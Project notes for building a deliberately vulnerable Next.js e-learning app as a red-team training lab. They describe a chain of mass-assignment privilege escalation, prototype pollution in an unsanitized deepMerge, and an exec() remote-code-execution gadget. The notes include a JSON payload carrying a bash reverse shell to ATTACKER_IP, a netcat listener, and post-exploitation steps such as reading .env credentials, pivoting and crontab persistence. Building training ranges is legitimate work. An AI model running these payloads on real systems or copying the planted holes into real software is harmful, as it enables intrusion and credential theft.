# React2Shell (CVE-2025-55182) Lab Development - Session Context
**Updated:** June 11, 2026
**Project:** e-learning-ui (Cyber Range Lab)

## 1. Project Status & Architecture
The project has been successfully upgraded from a static UI prototype to a functional, full-stack application designed specifically as a Red Team target.

*   **Framework:** Next.js 16.2.4 (React 19.2.5)
*   **Database:** PostgreSQL (via Prisma 7.8.0 ORM with `@prisma/adapter-pg`)
*   **Authentication:** NextAuth v5 (Credentials Provider with bcryptjs)
*   **Routing:** Edge-level RBAC implemented in `middleware.ts` + `auth.config.ts`.

### Network Topology (Target State)
*   **Public Network:** Web Server (Port 3000)
*   **Internal Network:** Database Server (`172.20.0.5`) - Contains sensitive credentials in `.env`.

## 2. The Vulnerability Chain (The Kill Chain)
The environment has been weaponized with a multi-stage attack path.

### Stage 1: Initial Access & Privilege Escalation
*   **Entry:** Attacker registers a new account via `/register` (Enforced as `STUDENT` server-side).
*   **Vulnerability:** IDOR & Mass Assignment in `updateUserProfile` (`lib/actions/user.ts`).
*   **Exploitation:** Attacker intercepts the profile update request (e.g., via `/student/settings` or Burp) and injects `"role": "LECTURER"`.
*   **Result:** Attacker escalates privileges to Lecturer, gaining access to `createAssignment` Server Action. Note: Escalation to `ADMIN` is intentionally blocked.

### Stage 2: Insecure Deserialization (Prototype Pollution)
*   **Entry:** Attacker (now LECTURER) calls the `createAssignment` Server Action.
*   **Vulnerability:** Prototype Pollution in `lib/utils/unsafeMerge.ts` (`deepMerge` function lacks `__proto__` / `constructor` / `prototype` sanitization).
*   **Injection Point:** `createAssignment` action (`lib/actions/assignment.ts`) merges user-provided JSON metadata via `deepMerge(baseMetadata, meta)`.
*   **Exploitation:** Attacker sends a JSON payload containing `__proto__` to pollute the global `Object.prototype`.

### Stage 3: Remote Code Execution (Command Template Pollution)
*   **Gadget:** A `child_process.exec` call in `createAssignment` designed for background logging. It reads a `logCommand` property from the metadata object. Since `Object.prototype` has been polluted, the attacker's command is executed instead of the default echo.
*   **Code (current):**
    ```typescript
    // assignment.ts — RCE gadget
    const logCommand = (baseMetadata as any).logCommand
      || `echo "[$(date)] Assignment created: ${title}" >> /tmp/assignment_logs.txt`;
    
    exec(logCommand, (error) => {
      if (error) console.error("Background logging failed:", error.message);
    });
    ```
*   **Why this works:** `deepMerge(baseMetadata, { __proto__: { logCommand: "..." } })` writes to `Object.prototype.logCommand`. When the code reads `(baseMetadata as any).logCommand`, it traverses the prototype chain and finds the attacker's value.
*   **Node.js 24 Compatibility:** This gadget works on all Node.js versions because it uses direct command injection into `exec()`, not `NODE_OPTIONS` or `--require`/`--import` flags.

### Stage 4: Post-Exploitation
*   **Credential Harvest:** `cat .env` reveals internal DB credentials (`DB_INTERNAL_HOST`, `DB_USER`, `DB_PASS`).
*   **Pivoting:** Use Chisel or SSH dynamic port forwarding through the compromised web server to reach the internal PostgreSQL at `172.20.0.5`.
*   **Persistence:** Crontab entry for automatic reverse shell reconnection every 5 minutes.

## 3. Verified Exploit Path (Final PoC)
1.  **Register/Login** as a Student via `/register` → `/login`.
2.  **Escalate** to Lecturer via Mass Assignment — call `updateUserProfile(myUserId, { role: "LECTURER" })` via Burp.
3.  **Re-login** to refresh the session with the new LECTURER role.
4.  **Pollute & RCE** by creating an assignment with a malicious JSON payload:
    ```json
    {
      "title": "Final Exam",
      "dueDate": "2026-06-30",
      "__proto__": {
        "logCommand": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
      }
    }
    ```
5.  **Trigger:** The `createAssignment` action merges the payload via `deepMerge()`, polluting `Object.prototype.logCommand`. The subsequent `exec(logCommand)` call executes the attacker's reverse shell command.

## 4. Key Files

| File | Role |
|---|---|
| `lib/actions/user.ts` | IDOR + Mass Assignment (STUDENT → LECTURER) |
| `lib/utils/unsafeMerge.ts` | Prototype Pollution (no `__proto__` sanitization) |
| `lib/actions/assignment.ts` | RCE gadget (`exec(logCommand)` with LECTURER auth gate) |
| `lib/actions/register.ts` | Secure registration (enforced STUDENT role) |
| `auth.config.ts` | Middleware RBAC (public routes: `/login`, `/register`, `/`) |
| `.env` | Contains internal DB credentials for pivoting |
| `trigger_rce.ts` | Standalone PoC script for dry-run testing |

## 5. Useful Commands
*   Start Server: `npm run dev`
*   Build: `npm run build`
*   Extract Server Action IDs: `cat .next/server/server-reference-manifest.json | grep -B5 "createAssignment"`
*   Test Prototype Pollution locally:
    ```bash
    node -e "
    function deepMerge(t,s){for(const k in s){if(typeof s[k]==='object'&&s[k]!==null){if(!t[k])t[k]={};deepMerge(t[k],s[k])}else{t[k]=s[k]}}return t}
    const o={};deepMerge(o,JSON.parse('{\"__proto__\":{\"logCommand\":\"id\"}}'));
    console.log(({}).logCommand)
    "
    ```
*   Start listener: `nc -lvnp 4444`
